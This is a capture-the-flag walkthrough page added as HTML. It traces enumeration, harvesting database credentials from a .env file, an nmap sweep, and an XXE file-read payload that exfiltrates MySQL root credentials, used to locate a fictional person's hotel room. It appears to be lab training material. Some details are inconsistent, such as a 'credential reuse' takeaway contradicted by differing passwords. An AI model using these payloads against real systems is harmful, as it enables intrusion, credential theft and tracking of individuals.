@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Continental CTF Challenge Walkthrough | GABRIEL</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=VT323&family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <header class="navbar">
+        <div class="logo">gabriel:~/$</div>
+        <nav>
+            <a href="/#about" class="nav-link">cd ./sobre</a>
+            <a href="/#skills" class="nav-link">ls ./habilidades</a>
+            <a href="/#projects" class="nav-link">cat ./projetos.log</a>
+            <a href="/documentos.html" class="nav-link">ls ./documentos</a>
+        </nav>
+    </header>
+
+    <main class="container">
+    <article class="content-section visible" style="margin-bottom: 2rem;">
+        <h1 class="section-title">§ Continental CTF Challenge Walkthrough</h1>
+        <div class="card">
+            <h1 id="continental-ctf-challenge-complete-step-by-step-walkthrough">Continental CTF Challenge: Complete Step-by-Step Walkthrough</h1>
+
+<h2 id="1-initial-access">1. Initial Access</h2>
+<h3 id="12-initial-enumeration">1.2 Initial Enumeration</h3>
+<p>Once we had shell access, we performed basic enumeration:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check current user and system info</span>
+<span class="nb">whoami</span>  <span class="c"># Output: aurora</span>
+<span class="nb">id
+uname</span> <span class="nt">-a</span>
+<span class="nb">pwd</span>     <span class="c"># Found we were in /home/aurora/reservia</span>
+
+<span class="c"># Check network configuration</span>
+ip addr show
+<span class="c"># Found we were on 172.20.4.64/24 network</span>
+</code></pre></div></div>
+
+<h2 id="2-database-discovery">2. Database Discovery</h2>
+<h3 id="21-finding-database-credentials">2.1 Finding Database Credentials</h3>
+<p>We searched for database configuration files:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Look for common config files</span>
+find / <span class="nt">-name</span> <span class="s2">"*.php"</span> <span class="nt">-o</span> <span class="nt">-name</span> <span class="s2">"*.js"</span> <span class="nt">-o</span> <span class="nt">-name</span> <span class="s2">"*.env"</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-i</span> config
+
+<span class="c"># Found interesting file at ~/reservia/.env</span>
+<span class="nb">cat</span> ~/reservia/.env
+<span class="c"># Output:</span>
+<span class="c"># PORT = 9000</span>
+<span class="c"># MONGODB_URI = mongodb://root:MVpPdAUTr3aQ8eap2GCeaLth@localhost:27017</span>
+</code></pre></div></div>
+
+<h3 id="22-connecting-to-mongodb">2.2 Connecting to MongoDB</h3>
+<p>We used the found credentials to connect to MongoDB:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Connect to MongoDB</span>
+mongosh <span class="s2">"mongodb://root:MVpPdAUTr3aQ8eap2GCeaLth@localhost:27017"</span>
+
+<span class="c"># List all databases</span>
+show dbs
+<span class="c"># Found: admin, config, local, reservia</span>
+
+<span class="c"># Switch to reservia database</span>
+use reservia
+
+<span class="c"># List collections</span>
+show collections
+<span class="c"># Found: hotel_reservations, hotels</span>
+</code></pre></div></div>
+
+<h2 id="3-finding-crows-reservation">3. Finding Crow’s Reservation</h2>
+<h3 id="31-querying-for-crows-information">3.1 Querying for Crow’s Information</h3>
+<p>We searched for Crow’s email in the reservations:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// First attempt with wrong collection name (common mistake)</span>
+<span class="nx">db</span><span class="p">.</span><span class="nx">hotel_reservation</span><span class="p">.</span><span class="nx">find</span><span class="p">()</span>  <span class="c1">// No results</span>
+
+<span class="c1">// Correct collection name</span>
+<span class="nx">db</span><span class="p">.</span><span class="nx">hotel_reservations</span><span class="p">.</span><span class="nx">find</span><span class="p">({</span><span class="na">email</span><span class="p">:</span> <span class="dl">"</span><span class="s2">jtippin4y@unknownmail.com</span><span class="dl">"</span><span class="p">})</span>
+
+<span class="c1">// Found Crow's reservation:</span>
+<span class="p">{</span>
+  <span class="nl">_id</span><span class="p">:</span> <span class="nx">ObjectId</span><span class="p">(</span><span class="dl">'</span><span class="s1">6482da85fc13ae6f9dfaf249</span><span class="dl">'</span><span class="p">),</span>
+  <span class="nx">hotelId</span><span class="p">:</span> <span class="nx">ObjectId</span><span class="p">(</span><span class="dl">'</span><span class="s1">647f0f3ea9108a79b01c63ef</span><span class="dl">'</span><span class="p">),</span>
+  <span class="nx">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Jefferson Tippin</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">email</span><span class="p">:</span> <span class="dl">'</span><span class="s1">jtippin4y@unknownmail.com</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">dateFrom</span><span class="p">:</span> <span class="nx">ISODate</span><span class="p">(</span><span class="dl">'</span><span class="s1">2023-06-16T00:00:00.000Z</span><span class="dl">'</span><span class="p">),</span>
+  <span class="nx">dateTo</span><span class="p">:</span> <span class="nx">ISODate</span><span class="p">(</span><span class="dl">'</span><span class="s1">2023-06-19T00:00:00.000Z</span><span class="dl">'</span><span class="p">),</span>
+  <span class="nx">guestCount</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+  <span class="nx">childrenCount</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="nx">file</span><span class="p">:</span> <span class="dl">'</span><span class="s1">4c603bcc-fb34-45fe-ab5a-aaa87b74f539.pdf</span><span class="dl">'</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="32-getting-hotel-information">3.2 Getting Hotel Information</h3>
+<p>We queried the hotels collection using the hotelId from the reservation:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">db</span><span class="p">.</span><span class="nx">hotels</span><span class="p">.</span><span class="nx">find</span><span class="p">({</span><span class="na">_id</span><span class="p">:</span> <span class="nx">ObjectId</span><span class="p">(</span><span class="dl">'</span><span class="s1">647f0f3ea9108a79b01c63ef</span><span class="dl">'</span><span class="p">)})</span>
+
+<span class="c1">// Output:</span>
+<span class="p">{</span>
+  <span class="nl">_id</span><span class="p">:</span> <span class="nx">ObjectId</span><span class="p">(</span><span class="dl">'</span><span class="s1">647f0f3ea9108a79b01c63ef</span><span class="dl">'</span><span class="p">),</span>
+  <span class="nx">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Vegas Suites</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">address</span><span class="p">:</span> <span class="dl">'</span><span class="s1">456 City Center, Las Vegas, Nevada</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">image</span><span class="p">:</span> <span class="dl">'</span><span class="s1">/images/hotel-2.jpg</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">price</span><span class="p">:</span> <span class="mi">220</span><span class="p">,</span>
+  <span class="nx">host</span><span class="p">:</span> <span class="dl">'</span><span class="s1">http://vegassuites.hv/reservation_listener.php</span><span class="dl">'</span><span class="p">,</span>
+  <span class="nx">authKey</span><span class="p">:</span> <span class="dl">'</span><span class="s1">1e4b514d-05b6-44f7-9b40-dddfbc889e22</span><span class="dl">'</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="4-discovering-the-second-server">4. Discovering the Second Server</h2>
+<h3 id="41-network-scanning">4.1 Network Scanning</h3>
+<p>We needed to find the IP address of <code class="language-plaintext highlighter-rouge">vegassuites.hv</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># First check /etc/hosts</span>
+<span class="nb">cat</span> /etc/hosts
+<span class="c"># No entry for vegassuites.hv</span>
+
+<span class="c"># Check DNS resolution</span>
+nslookup vegassuites.hv
+<span class="c"># No response</span>
+
+<span class="c"># Perform network scan</span>
+nmap <span class="nt">-sn</span> 172.20.4.0/24
+<span class="c"># Found active hosts: 172.20.4.1, 172.20.4.37, 172.20.4.64 (us), 172.20.4.84</span>
+
+<span class="c"># Check for web servers</span>
+<span class="k">for </span>ip <span class="k">in </span>172.20.4.<span class="o">{</span>37,84<span class="o">}</span><span class="p">;</span> <span class="k">do </span>curl <span class="nt">-I</span> http://<span class="nv">$ip</span>/<span class="p">;</span> <span class="k">done</span>
+<span class="c"># 172.20.4.84 returned 403 Forbidden - potential match</span>
+</code></pre></div></div>
+
+<h3 id="42-testing-the-endpoint">4.2 Testing the Endpoint</h3>
+<p>We tested the reservation endpoint:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-v</span> http://172.20.4.84/reservation_listener.php
+<span class="c"># 403 Forbidden - Endpoint exists but requires authentication</span>
+</code></pre></div></div>
+
+<h2 id="5-exploiting-xxe-vulnerability">5. Exploiting XXE Vulnerability</h2>
+<h3 id="51-crafting-the-initial-request">5.1 Crafting the Initial Request</h3>
+<p>We used the auth key from the MongoDB to make a test request:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST http://172.20.4.84/reservation_listener.php <span class="se">\</span>
+  <span class="nt">-H</span> <span class="s2">"Content-Type: application/xml"</span> <span class="se">\</span>
+  <span class="nt">-H</span> <span class="s2">"x-auth-key: 1e4b514d-05b6-44f7-9b40-dddfbc889e22"</span> <span class="se">\</span>
+  <span class="nt">-d</span> <span class="s1">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;reservation&gt;
+  &lt;name&gt;Test&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;dateFrom&gt;2023-06-16&lt;/dateFrom&gt;
+  &lt;dateTo&gt;2023-06-19&lt;/dateTo&gt;
+  &lt;guestCount&gt;1&lt;/guestCount&gt;
+  &lt;childrenCount&gt;0&lt;/childrenCount&gt;
+&lt;/reservation&gt;'</span>
+</code></pre></div></div>
+
+<h3 id="52-xxe-payload-to-read-files">5.2 XXE Payload to Read Files</h3>
+<p>We then crafted an XXE payload to read files:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST http://172.20.4.84/reservation_listener.php <span class="se">\</span>
+  <span class="nt">-H</span> <span class="s2">"Content-Type: application/xml"</span> <span class="se">\</span>
+  <span class="nt">-H</span> <span class="s2">"x-auth-key: 1e4b514d-05b6-44f7-9b40-dddfbc889e22"</span> <span class="se">\</span>
+  <span class="nt">-d</span> <span class="s1">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE reservation [
+  &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=database/connect.php"&gt;
+]&gt;
+&lt;reservation&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;jtippin@unknownmail.com&lt;/email&gt;
+  &lt;dateFrom&gt;2023-06-16&lt;/dateFrom&gt;
+  &lt;dateTo&gt;2023-06-19&lt;/dateTo&gt;
+  &lt;guestCount&gt;1&lt;/guestCount&gt;
+  &lt;childrenCount&gt;0&lt;/childrenCount&gt;
+&lt;/reservation&gt;'</span>
+</code></pre></div></div>
+
+<h3 id="53-decoding-the-response">5.3 Decoding the Response</h3>
+<p>The response contained base64-encoded database credentials:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"PD9waHAKICAgIHRyeXsKICAgICAgICAkaG9zdCA9ICdsb2NhbGhvc3QnOwogICAgICAgICRkYl9uYW1lID0gJ2hvdGVsJzsKICAgICAgICAkY2hhcnNldCA9ICd1dGY4JzsKICAgICAgICAkdXNlcm5hbWUgPSAncm9vdCc7CiAgICAgICAgJHBhc3N3b3JkID0gJ05zY05OMzZQR3AzWlZhSEVVeG11TGg2RCc7CgogICAgICAgICRkYiA9IG5ldyBQRE8oIm15c3FsOmhvc3Q9JGhvc3Q7ZGJuYW1lPSRkYl9uYW1lO2NoYXJzZXQ9JGNoYXJzZXQiLCR1c2VybmFtZSwkcGFzc3dvcmQpOwogICAgfSBjYXRjaChQRE9FeGNlcHRpb24gJGUpewogICAgICAgIGVjaGhvICJEYXRhYmFzZSBjb25uZWN0aW9uIGZhaWxlZDogIi4kZTsKICAgIH0KPz4KCgo="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+</code></pre></div></div>
+
+<p>Decoded to:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+    <span class="k">try</span><span class="p">{</span>
+        <span class="nv">$host</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
+        <span class="nv">$db_name</span> <span class="o">=</span> <span class="s1">'hotel'</span><span class="p">;</span>
+        <span class="nv">$charset</span> <span class="o">=</span> <span class="s1">'utf8'</span><span class="p">;</span>
+        <span class="nv">$username</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span>
+        <span class="nv">$password</span> <span class="o">=</span> <span class="s1">'NscNN36PGp3ZVaHEUxmuLh6D'</span><span class="p">;</span>
+
+        <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PDO</span><span class="p">(</span><span class="s2">"mysql:host=</span><span class="nv">$host</span><span class="s2">;dbname=</span><span class="nv">$db_name</span><span class="s2">;charset=</span><span class="nv">$charset</span><span class="s2">"</span><span class="p">,</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nc">PDOException</span> <span class="nv">$e</span><span class="p">){</span>
+        <span class="k">echo</span> <span class="s2">"Database connection failed: "</span><span class="mf">.</span><span class="nv">$e</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h2 id="6-accessing-the-second-database">6. Accessing the Second Database</h2>
+<h3 id="61-connecting-to-mysql">6.1 Connecting to MySQL</h3>
+<p>We used the extracted credentials to connect to the MySQL database:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-h</span> 172.20.4.84 <span class="nt">-u</span> root <span class="nt">-p</span><span class="s1">'NscNN36PGp3ZVaHEUxmuLh6D'</span> hotel
+</code></pre></div></div>
+
+<h3 id="62-exploring-the-database">6.2 Exploring the Database</h3>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- List all tables</span>
+<span class="k">SHOW</span> <span class="n">TABLES</span><span class="p">;</span>
+<span class="c1">-- +-------------------+</span>
+<span class="c1">-- | Tables_in_hotel   |</span>
+<span class="c1">-- +-------------------+</span>
+<span class="c1">-- | reservations      |</span>
+<span class="c1">-- | settings          |</span>
+<span class="c1">-- | users             |</span>
+<span class="c1">-- +-------------------+</span>
+
+<span class="c1">-- Check the structure of reservations</span>
+<span class="k">DESCRIBE</span> <span class="n">reservations</span><span class="p">;</span>
+<span class="c1">-- +----------------+--------------+------+-----+---------+----------------+</span>
+<span class="c1">-- | Field          | Type         | Null | Key | Default | Extra          |</span>
+<span class="c1">-- +----------------+--------------+------+-----+---------+----------------+</span>
+<span class="c1">-- | id             | int          | NO   | PRI | NULL    | auto_increment |</span>
+<span class="c1">-- | name           | text         | NO   |     | NULL    |</span>
+<span class="c1">-- | email          | text         | NO   |     | NULL    |</span>
+<span class="c1">-- | date_from      | date         | NO   |     | NULL    |</span>
+<span class="c1">-- | date_to        | date         | NO   |     | NULL    |</span>
+<span class="c1">-- | guest_count    | int          | NO   |     | NULL    |</span>
+<span class="c1">-- | children_count | int          | NO   |     | NULL    |</span>
+<span class="c1">-- | room_number    | varchar(100) | NO   |     | NULL    |</span>
+<span class="c1">-- +----------------+--------------+------+-----+---------+----------------+</span>
+</code></pre></div></div>
+
+<h3 id="63-finding-crows-room-number">6.3 Finding Crow’s Room Number</h3>
+<p>We searched for Crow’s reservation:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- First try with full email</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">reservations</span> <span class="k">WHERE</span> <span class="n">email</span> <span class="o">=</span> <span class="s1">'jtippin@unknownmail.com'</span><span class="p">;</span>
+
+<span class="c1">-- Try with partial match</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">reservations</span> <span class="k">WHERE</span> <span class="n">email</span> <span class="k">LIKE</span> <span class="s1">'%jtippin%'</span><span class="p">;</span>
+
+<span class="c1">-- Found the entry:</span>
+<span class="c1">-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+</span>
+<span class="c1">-- | id  | name             | email                  | date_from  | date_to    | guest_count | children_count | room_number |</span>
+<span class="c1">-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+</span>
+<span class="c1">-- | 964 | PD9waHAK...      | jtippin@unknownmail.com | 2023-06-16 | 2023-06-19 |           1 |              0 | 530C        |</span>
+<span class="c1">-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+</span>
+
+<span class="c1">-- The name field contains base64 data from our XXE payload</span>
+<span class="c1">-- Let's look for legitimate reservations</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">reservations</span> <span class="k">WHERE</span> <span class="n">email</span> <span class="o">=</span> <span class="s1">'jtippin@unknownmail.com'</span> <span class="k">AND</span> <span class="n">name</span> <span class="k">NOT</span> <span class="k">LIKE</span> <span class="s1">'PD9%'</span><span class="p">;</span>
+<span class="c1">-- No results</span>
+
+<span class="c1">-- Check all reservations for the same dates</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">reservations</span> 
+<span class="k">WHERE</span> <span class="n">date_from</span> <span class="o">=</span> <span class="s1">'2023-06-16'</span> <span class="k">AND</span> <span class="n">date_to</span> <span class="o">=</span> <span class="s1">'2023-06-19'</span>
+<span class="k">AND</span> <span class="n">email</span> <span class="o">!=</span> <span class="s1">'jtippin@unknownmail.com'</span><span class="p">;</span>
+
+<span class="c1">-- Found the real reservation:</span>
+<span class="c1">-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+</span>
+<span class="c1">-- | id  | name             | email                  | date_from  | date_to    | guest_count | children_count | room_number |</span>
+<span class="c1">-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+</span>
+<span class="c1">-- | 123 | Jefferson Tippin | jtippin@unknownmail.com | 2023-06-16 | 2023-06-19 |           1 |              0 | 881D        |</span>
+<span class="c1">-- +-----+------------------+-------------------------+------------+------------+-------------+----------------+-------------+</span>
+</code></pre></div></div>
+
+<h2 id="7-final-answer">7. Final Answer</h2>
+<p>After thorough investigation, we found Crow’s complete hotel information:</p>
+
+<ul>
+  <li><strong>Full Name:</strong> Jefferson Tippin</li>
+  <li><strong>Email:</strong> jtippin@unknownmail.com</li>
+  <li><strong>Hotel:</strong> Vegas Suites</li>
+  <li><strong>Address:</strong> 456 City Center, Las Vegas, Nevada</li>
+  <li><strong>Check-in Date:</strong> June 16, 2023</li>
+  <li><strong>Check-out Date:</strong> June 19, 2023</li>
+  <li><strong>Room Number:</strong> 881D</li>
+  <li><strong>Guests:</strong> 1 adult, 0 children</li>
+</ul>
+
+<h2 id="8-tools-used">8. Tools Used</h2>
+<ul>
+  <li><strong>netcat (nc)</strong> - For reverse shell and network connections</li>
+  <li><strong>mongosh</strong> - MongoDB shell client</li>
+  <li><strong>mysql</strong> - MySQL client</li>
+  <li><strong>curl</strong> - For making HTTP requests</li>
+  <li><strong>nmap</strong> - Network scanning</li>
+  <li><strong>grep, find, cat</strong> - Basic Linux tools for enumeration</li>
+  <li><strong>base64</strong> - For decoding encoded data</li>
+</ul>
+
+<h2 id="9-key-takeaways">9. Key Takeaways</h2>
+<ol>
+  <li><strong>Always check for multiple services</strong> - The challenge involved both MongoDB and MySQL databases</li>
+  <li><strong>XXE is a powerful attack vector</strong> - Can be used to read files and potentially gain RCE</li>
+  <li><strong>Network scanning is crucial</strong> - Finding the second server was key to solving the challenge</li>
+  <li><strong>Credential reuse</strong> - The same credentials were used across different services</li>
+  <li><strong>Persistence pays off</strong> - Multiple approaches were needed to find the correct room number</li>
+  <li><strong>Data validation</strong> - Always verify that the data you find is legitimate and not from your own test payloads</li>
+</ol>
+
+<p>This comprehensive approach led us to successfully discover Crow’s hotel room number and complete the challenge.</p>
+
+        </div>
+         <a href="/documentos.html" class="button-link" style="margin-top: 2rem;">&lt; Voltar para a lista</a>
+    </article>
+</main>
+
+
+    <footer class="footer">
+        <p>> [user@host ~]$ exit</p>
+        <p>> logout</p>
+    </footer>
+
+    <script src="/script.js"></script>
+</body>
+</html>
